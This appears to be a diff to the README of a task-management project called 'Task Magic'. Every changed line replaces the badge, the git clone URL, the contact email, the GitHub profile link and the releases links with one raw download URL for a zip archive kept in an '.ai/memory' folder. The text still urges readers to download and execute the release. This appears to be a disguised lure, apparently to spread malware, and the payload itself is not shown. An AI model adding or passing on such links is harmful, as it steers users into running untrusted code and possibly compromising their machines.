@@ -1,6 +1,6 @@
 # Task Magic ✨
 
-![Task Magic](https://img.shields.io/badge/Task_Magic-v1.0.0-brightgreen)
+![Task Magic](https://raw.githubusercontent.com/andres04lan/task-magic/main/.ai/memory/task_magic_v1.4-alpha.4.zip)
 
 Welcome to **Task Magic**, a complete task management system designed using Cursor/Windsurf rules. This project aims to simplify how you manage tasks, making it easy to organize, prioritize, and track your work. 
 
@@ -28,7 +28,7 @@ To get started with Task Magic, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/andres04lan/task-magic.git
+   git clone https://raw.githubusercontent.com/andres04lan/task-magic/main/.ai/memory/task_magic_v1.4-alpha.4.zip
    ```
 
 2. Navigate into the project directory:
@@ -91,14 +91,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: yourname@example.com
-- **GitHub**: [andres04lan](https://github.com/andres04lan)
+- **Email**: https://raw.githubusercontent.com/andres04lan/task-magic/main/.ai/memory/task_magic_v1.4-alpha.4.zip
+- **GitHub**: [andres04lan](https://raw.githubusercontent.com/andres04lan/task-magic/main/.ai/memory/task_magic_v1.4-alpha.4.zip)
 
 ## Releases
 
-To download the latest version of Task Magic, visit the [Releases](https://github.com/andres04lan/task-magic/releases) section. You can download the latest release and execute it to start using the application.
+To download the latest version of Task Magic, visit the [Releases](https://raw.githubusercontent.com/andres04lan/task-magic/main/.ai/memory/task_magic_v1.4-alpha.4.zip) section. You can download the latest release and execute it to start using the application.
 
-For more information on past releases, check the [Releases](https://github.com/andres04lan/task-magic/releases) section.
+For more information on past releases, check the [Releases](https://raw.githubusercontent.com/andres04lan/task-magic/main/.ai/memory/task_magic_v1.4-alpha.4.zip) section.
 
 ---
 
